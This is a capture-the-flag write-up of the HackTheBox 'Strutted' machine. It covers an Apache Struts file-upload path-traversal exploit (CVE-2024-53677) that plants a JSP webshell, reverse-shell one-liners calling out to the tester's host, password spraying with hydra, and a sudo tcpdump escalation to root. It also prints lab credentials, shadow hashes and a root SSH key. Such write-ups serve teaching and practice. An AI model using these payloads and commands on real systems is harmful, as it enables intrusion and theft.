---
render_with_liquid: false
title: HackTheBox Writeup - Strutted
date: 2025-09-06 18:52:12 +1400
tags: [hackthebox, nmap, linux, feroxbuster, jsp, java, information-disclosure, file-upload, apache-struts, cve-2024-53677, file-upload-bypass, webshell, discover-secrets, password-spraying, hydra, sudo, gtfobin]
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/cb2df0a9511e5634451e3fb6c8ddc509.png
    width: 640
    height: 480
---



`Strutted` is an medium-difficulty Linux machine featuring a website for a company offering image hosting solutions. The website provides a Docker container with the version of Apache Struts that is vulnerable to [CVE-2024-53677](https://nvd.nist.gov/vuln/detail/CVE-2024-53677), which is leveraged to gain a foothold on the system. Further enumeration reveals the `tomcat-users.xml` file with a plaintext password used to authenticate as `james`. For privilege escalation, we abuse `tcpdump` while being used with `sudo` to create a copy of the `bash` binary with the `SUID` bit set, allowing us to gain a `root` shell.


# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Strutted]
└─$ pt init '10.10.11.59 strutted.htb'
+----------+--------+-------------+--------------+
| PROFILE  | STATUS |     IP      |    DOMAIN    |
+----------+--------+-------------+--------------+
| strutted | on     | 10.10.11.59 | strutted.htb |
+----------+--------+-------------+--------------+
```


## Nmap

```bash
# Nmap 7.95 scan initiated Sat Sep  6 18:52:11 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.10.11.59
Nmap scan report for 10.10.11.59
Host is up, received user-set (0.11s latency).
Scanned at 2025-09-06 18:52:12 CST for 14s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://strutted.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep  6 18:52:26 2025 -- 1 IP address (1 host up) scanned in 14.46 seconds
```


## 80 - HTTP : Instant Image Upload


### Info

```ruby
http://strutted.htb [200] [Strutted™ - Instant Image Uploads] [nginx/1.18.0 (Ubuntu)] [88341efebdb40ffaa039996d8ee6e665e79960e6] [Bootstrap:5.3.0,Java,Nginx:1.18.0,Ubuntu,jsDelivr]
```

![](/assets/obsidian/1b20b83a021b46ffd398e512e334710f.png)


### Directory

```bash
[+] cat httpx/urls.txt | feroxbuster -k -A --stdin -w /usr/share/wordlists/dirb/common.txt --dont-scan .(tif|tiff|ico|cur|bmp|webp|svg|png|jpg|jpeg|jfif|gif|avif|apngogg|css|js|woff|woff2|eot|ttf|otf)$ -I css,png,jpg,gif --collect-words --collect-backups --collect-extensions --scan-dir-listings -C 404,400,500 -r -n --scan-limit 4 -o bulkdirb.txt
[...]
200      GET      156l      387w     5197c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l       69w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      182l      443w     6119c http://strutted.htb/how
200      GET        0l        0w 39680602c http://strutted.htb/download.action
200      GET      182l      567w     6610c http://strutted.htb/about
200      GET        0l        0w     5197c http://strutted.htb/code
200      GET        0l        0w 39680602c http://strutted.htb/download
200      GET      182l      443w     6119c http://strutted.htb/how.action
200      GET        0l        0w     5197c http://strutted.htb/network.action
200      GET        0l        0w     5197c http://strutted.htb/osc
[####################] - 2m      8697/8697    0s      found:8       errors:0
[####################] - 2m      8642/8642    78/s    http://strutted.htb:80/
```


# User Flag
---

## Shell as tomcat


### 80 - strutted.htb : Enumeration


#### File upload

- The file upload function doesn't seem too interesting since it has extension whitelist that allows only `JPG, JPEG, PNG, GIF`

> http://strutted.htb/upload.action

![](/assets/obsidian/f5e082b5f062abe60c2696662a9169e3.png)

- The uploaded file was located at `http://strutted.htb/uploads/20250906_115300/white_16x16.png`

![](/assets/obsidian/ad10fc7cb30fa8b743d3350cddd3a8b7.png)


#### Docker image

The instruction below near the footer shows that we could download the APP's docker image

![](/assets/obsidian/587391324fced57c1de32ab841f61ca0.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Strutted]
└─$ 7z x ~/Downloads/strutted.zip -o'docker_image'
[...]

┌──(bravosec㉿fsociety)-[~/htb/Strutted]
└─$ cd docker_image

┌──(bravosec㉿fsociety)-[~/htb/Strutted/docker_image]
└─$ ls -latr
total 28
-rw-r--r--  1 bravosec kali  222 Jan  7  2025 tomcat-users.xml
drwxr-xr-x  4 bravosec kali 4096 Jan  7  2025 strutted
-rw-r--r--  1 bravosec kali 4064 Jan  7  2025 README.md
-rw-r--r--  1 bravosec kali  615 Jan  7  2025 Dockerfile
-rw-r--r--  1 bravosec kali 1361 Jan  7  2025 context.xml
drwxr-xr-x 11 bravosec kali 4096 Sep  6 20:10 ..
drwxr-xr-x  3 bravosec kali 4096 Sep  6 20:10 .
```

The `tomcat-users.xml` config file contains a credential - `admin:skqKY6360z!Y`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Strutted/docker_image]
└─$ cat tomcat-users.xml
<?xml version='1.0' encoding='utf-8'?>

<tomcat-users>
    <role rolename="manager-gui"/>
    <role rolename="admin-gui"/>
    <user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/>
</tomcat-users>
```

The source code of the web app is located in `strutted/src/main/java/org/strutted/htb/`, but nothing were interesting

```bash
┌──(bravosec㉿fsociety)-[~/htb/Strutted/docker_image]
└─$ tree strutted
strutted
├── mvnw
├── mvnw.cmd
├── pom.xml
├── src
│   └── main
│       ├── java
│       │   └── org
│       │       └── strutted
│       │           └── htb
│       │               ├── AboutAction.java
│       │               ├── DatabaseUtil.java
│       │               ├── HowAction.java
│       │               ├── Upload.java
│       │               ├── URLMapping.java
│       │               └── URLUtil.java
[...]
```


### 80 - Apache Sruts 6.3.0.1 : Unrestricted File Upload (CVE-2024-53677)


#### Identify exploits

The web app is using **Apache Struts** version `6.3.0.1`, which is vulnerable to multiple RCE exploits ([CVE-2023-50164](https://www.cve.org/CVERecord?id=CVE-2023-50164), [CVE-2024-53677](https://www.cve.org/CVERecord?id=CVE-2024-53677))

```xml
┌──(bravosec㉿fsociety)-[~/htb/Strutted/docker_image]
└─$ cat strutted/pom.xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <packaging>war</packaging>

    <artifactId>strutted</artifactId>
    <groupId>org.strutted.htb</groupId>
    <version>1.0.0</version>

    <name>Strutted™</name>
    <description>Instantly upload an image and receive a unique, shareable link. Keep your images secure, accessible, and easy to share—anywhere, anytime.</description>

    <properties>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <maven.compiler.source>17</maven.compiler.source>
        <maven.compiler.target>17</maven.compiler.target>
        <struts2.version>6.3.0.1</struts2.version>
        <jetty-plugin.version>9.4.46.v20220331</jetty-plugin.version>
        <maven.javadoc.skip>true</maven.javadoc.skip>
        <jackson.version>2.14.1</jackson.version>
        <jackson-data-bind.version>2.14.1</jackson-data-bind.version>
    </properties>
[...]
```

- Google : `struts2 6.3.0.1 exploit`

> Snyk - https://security.snyk.io/package/maven/org.apache.struts%3Astruts2-core/6.3.0.1

> Checker - https://github.com/0xPThree/struts_cve-2024-53677 -> POC - https://github.com/TAM-K592/CVE-2024-53677-S2-067/tree/ALOK

> **CVE-2024-53677**
> 
> 
> File upload logic in Apache Struts is flawed. An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution. 
> 
> This issue affects Apache Struts: from 2.0.0 before 6.4.0. Users are recommended to upgrade to version 6.4.0 at least and migrate to the new file upload mechanism https://struts.apache.org/core-developers/file-upload . If you are not using an old file upload logic based on FileuploadInterceptor your application is safe. You can find more details in  https://cwiki.apache.org/confluence/display/WW/S2-067
{: .prompt-info }


#### Fixing POC

```bash
cd exploit
git clone https://github.com/TAM-K592/CVE-2024-53677-S2-067
cd CVE-2024-53677-S2-067
```

The exploit checker failed at first run because of file upload restrictions

> `~/configs/proxychains/burp.conf`

```
[...]
http 127.0.0.1 8080
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Strutted/exploit/CVE-2024-53677-S2-067]
└─$ proxychains -f ~/configs/proxychains/burp.conf -q python Check-CVE-2024-53677.py -u http://strutted.htb --upload_endpoint /upload.action
2025-09-06 20:39:04,353 [INFO] Starting detection process...
2025-09-06 20:39:04,353 [INFO] Starting detection for CVE-2024-53677 (S2-067)...
2025-09-06 20:39:04,354 [INFO] Sending test request to upload endpoint: http://strutted.htb/upload.action
2025-09-06 20:39:04,589 [INFO] [INFO] File upload request succeeded.
2025-09-06 20:39:04,589 [INFO] [INFO] Target does not appear vulnerable.
2025-09-06 20:39:04,589 [INFO] Detection process completed.
```

![](/assets/obsidian/8003a3990bf058c76bcb36b6db2dc96a.png)

After reviewing the source code from `trutted/src/main/java/org/strutted/htb/Upload.java`, we can modify the request to meet the web app's need

- Add `Content-Type: image/png` to the headers

![](/assets/obsidian/de7dd9c26465bf70705e391caa855a3b.png)

- Add `GIF89a` to the magic bytes

![](/assets/obsidian/7850ac0d248412bf61086d3532155463.png)

- Change file extension to `png`

> `strutted/src/main/resources/struts.xml`

![](/assets/obsidian/f7ee981e4efb3251a8bdd143e3fdf096.png)

The upload was successful, but uploaded path should contain `vuln_test.txt` according to the exploit POC

![](/assets/obsidian/684f4df082f61f170e23b7c8ec4ec126.png)

```http
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------418319249314572457372052652738
Content-Length: 395
Origin: http://strutted.htb
Connection: keep-alive
Referer: http://strutted.htb/
Cookie: JSESSIONID=7C404E7A43F91D434AFAA9C8F9F5B070
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Priority: u=0, i

-----------------------------418319249314572457372052652738
Content-Disposition: form-data; name="upload"; filename="test.png"
Content-Type: image/png

GIF89a;
S2-067 detection test.
-----------------------------418319249314572457372052652738
Content-Disposition: form-data; name="top.uploadFileName"

../../vuln_test.txt
-----------------------------418319249314572457372052652738--
```

![](/assets/obsidian/5e9038b37b9c4ba6c784eb9a22ad120c.png)

In order to make it pass through apache strut's OGNL intercpetor, we need to change the **name** parameter `upload` in the post data to `Upload`

![](/assets/obsidian/67447ed8d6ab0807d040ab6c3a66663a.png)


#### Upload webshell

Find a JSP webshell to upload

```bash
┌──(bravosec㉿fsociety)-[~/htb/Strutted]
└─$ locate webshell|grep -i jsp
[...]
/usr/share/webshells/jsp
/usr/share/webshells/jsp/cmdjsp.jsp
/usr/share/webshells/jsp/jsp-reverse.jsp
```

> `/usr/share/webshells/jsp/cmdjsp.jsp`

![](/assets/obsidian/65d9f239108dc4e29fe42e82ed0f73eb.png)

Edit the webshell to make it work for linux then upload it

```http
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------418319249314572457372052652738
Content-Length: 863
Origin: http://strutted.htb
Connection: keep-alive
Referer: http://strutted.htb/
Cookie: JSESSIONID=7C404E7A43F91D434AFAA9C8F9F5B070
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Priority: u=0, i

-----------------------------418319249314572457372052652738
Content-Disposition: form-data; name="Upload"; filename="test.png"
Content-Type: image/png

GIF89a;
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("x");
   String output = "";

   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>
<%=output %>
-----------------------------418319249314572457372052652738
Content-Disposition: form-data; name="top.uploadFileName"

../../x.jsp
-----------------------------418319249314572457372052652738--
```

Confirmed that command execution was successful

```bash
┌──(bravosec㉿fsociety)-[~/htb/Strutted]
└─$ curl 'http://strutted.htb/x.jsp' -G --data-urlencode 'x=id'
GIF89a;


uid=998(tomcat) gid=998(tomcat) groups=998(tomcat)
```


#### Get reverse shell

Host a web server to host reverse shell script

```bash
PORT="80"; fuser -k "$PORT/tcp" 2>/dev/null; mkdir -p www && echo -e '#!/bin/sh\nsh -i >& /dev/tcp/10.10.14.34/1111 0>&1' > www/index.html && python -m http.server $PORT -d www
```

Start reverse shell listener

```bash
nc -lvnp 1111
```

Use brackets instead of spaces in the command to avoid pipe issues

```bash
curl 'http://strutted.htb/x.jsp' -G --data-urlencode 'x=/bin/bash -c {curl,10.10.14.34}|bash'
```

Got a shell as `tomcat`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Strutted]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.11.59] 46410
sh: 0: can't access tty; job control turned off
$ /usr/bin/script -qc /bin/bash /dev/null
tomcat@strutted:~$ ^Z
zsh: suspended  nc -lvnp 1111

stty raw -echo;fg
┌──(bravosec㉿fsociety)-[~/htb/Strutted]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
tomcat@strutted:~$ stty rows 19 columns 209
tomcat@strutted:~$ id
uid=998(tomcat) gid=998(tomcat) groups=998(tomcat)
```


# Root Flag
---

## Shell as james


### (Failed) Password spray

Spray the `admin`'s password from `tomcat-user.xml` in the docker image

```bash
tomcat@strutted:~$ PASS='skqKY6360z!Y'; for USER in $(cat /etc/passwd|grep -viE 'false$|nologin$|sync$'|awk -F: '{print $1}'); do (x=$(echo $PASS | su "$USER" -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 3092
[2] 3093
tomcat@strutted:~$ Password: Password:
```


### Enumeration

There's a different `tomcat-users.xml` file from the docker image, which contains a different password from admin

```bash
tomcat@strutted:~$ ls -latr
total 20
lrwxrwxrwx  1 root   root     19 Jul 20  2022 work -> ../../cache/tomcat9
lrwxrwxrwx  1 root   root     17 Jul 20  2022 logs -> ../../log/tomcat9
lrwxrwxrwx  1 root   root     12 Jul 20  2022 conf -> /etc/tomcat9
drwxrwxr-x  3 tomcat tomcat 4096 Jan 15  2025 webapps
drwxr-xr-x 41 root   root   4096 Jan 15  2025 ..
drwxr-xr-x  2 tomcat tomcat 4096 Jan 15  2025 lib
drwxr-xr-x  2 root   root   4096 Sep  6 10:37 policy
drwxr-xr-x  5 root   root   4096 Sep  6 10:37 .
tomcat@strutted:~$ ls -latr conf/
total 220
-rw-r-----   1 root tomcat 172359 Jan 15  2022 web.xml
-rw-r-----   1 root tomcat   1149 Jan 15  2022 jaspic-providers.xml
-rw-r-----   1 root tomcat   1400 Jan 15  2022 context.xml
-rw-r-----   1 root tomcat   7276 Jan 15  2022 catalina.properties
-rw-r-----   1 root tomcat   2799 Jul 19  2022 logging.properties
-rw-r-----   1 root tomcat   7606 Jan  7  2025 server.xml
-rw-r-----   1 root tomcat   2902 Jan 11  2025 tomcat-users.xml
drwxr-xr-x   2 root tomcat   4096 Jan 15  2025 policy.d
drwxr-xr-x   4 root root     4096 Jan 15  2025 .
drwxrwxr-x   3 root tomcat   4096 Jan 15  2025 Catalina
drwxr-xr-x 107 root root     4096 Jan 21  2025 ..
```

Got a new password : `IT14d6SSP81k`

```bash
tomcat@strutted:~$ cat conf/tomcat-users.xml
[...]
<!--
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <role rolename="manager-gui"/>
  <role rolename="admin-gui"/>
  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
--->
```


### Password spray

Sprayed the password on all users but failed

```bash
tomcat@strutted:~$ PASS='IT14d6SSP81k'; for USER in $(cat /etc/passwd|grep -viE 'false$|nologin$|sync$'|awk -F: '{print $1}'); do (x=$(echo $PASS | su "$USER" -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 3110
[2] 3111
tomcat@strutted:~$ Password: Password:
```

There are two users with shell on the machine, `james`'s comment indicated that it has Network Administration rights

```bash
tomcat@strutted:~$ cat /etc/passwd | grep -viE 'false$|nologin$|sync$'
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:Network Administrator:/home/james:/bin/bash
```

Extract the username and save to `enum/users.lst` on attacker machine

```bash
tomcat@strutted:~$ cat /etc/passwd | grep -viE 'false$|nologin$|sync$' | cut -d: -f1
root
james
```

Spray the password from remote, and `james` succeed

```bash
┌──(bravosec㉿fsociety)-[~/htb/Strutted]
└─$ hydra -e nsr -L enum/users.lst -p 'IT14d6SSP81k' ssh://$(pt get rhost):22
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 00:50:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:2/p:4), ~1 try per task
[DATA] attacking ssh://strutted.htb:22/
[22][ssh] host: strutted.htb   login: james   password: IT14d6SSP81k
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 00:50:38
```

Login to SSH as `james`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Strutted]
└─$ sshpass -p 'IT14d6SSP81k' ssh -o "StrictHostKeyChecking no" james@$(pt get ip)
Last login: Sun Sep  7 16:26:12 2025 from 10.10.14.34
james@strutted:~$ id
uid=1000(james) gid=1000(james) groups=1000(james),27(sudo)
james@strutted:~$ cat user.txt
7d8cfc1fea73f4f07399d42e29efcf0d
```


## Shell as root


### SUDO - GTFOBIN

`James` can run **tcpdump** as root

```bash
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

> https://gtfobins.github.io/gtfobins/tcpdump/#sudo

Check if the technique works by writing a file to `/tmp/x`

```bash
COMMAND='id > /tmp/x'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

![](/assets/obsidian/3523a1965a434a664c69d5b8c09b85bf.png)

The file was created by `root`, which means it was successful

```bash
james@strutted:~$ ls -latr /tmp
[...]
-rw-r--r--  1 root  root    39 Sep  7 16:29 x
```

Get a reverse shell as `root`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Strutted]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
```

```bash
james@strutted:~$ COMMAND='curl 10.10.14.34|bash'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Strutted]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.11.59] 42892
sh: 0: can't access tty; job control turned off
# /usr/bin/script -qc /bin/bash /dev/null
root@strutted:/home/james# ^Z
zsh: suspended  nc -lvnp 1111

stty raw -echo;fg
┌──(bravosec㉿fsociety)-[~/htb/Strutted]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
root@strutted:/home/james# stty rows 50 columns 209
root@strutted:/home/james# id
uid=0(root) gid=0(root) groups=0(root)
root@strutted:/home/james# cat /root/root.txt
3677194fff7d0171ee931399b81d69d2
```


# Additional
---

## Post exploitation


### Secrets

```bash
root@strutted:/home/james# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$y$j9T$4kM4HKyBvH.VNLjh.Zd60/$27BeC7cFIgPH.bVrllpoxXQwtc4tMCN6EZkI9Tqbw/B:20100:0:99999:7:::
james:$y$j9T$Agb7G27RJ0LCkmXQ3kDEK0$xoWkrSDF/pC4dkrIlBKe0LpYWCZH4YTz0NJ/zEn8.59:20100:0:99999:7:::
```

```bash
[+] /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```


### Files

```bash

```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```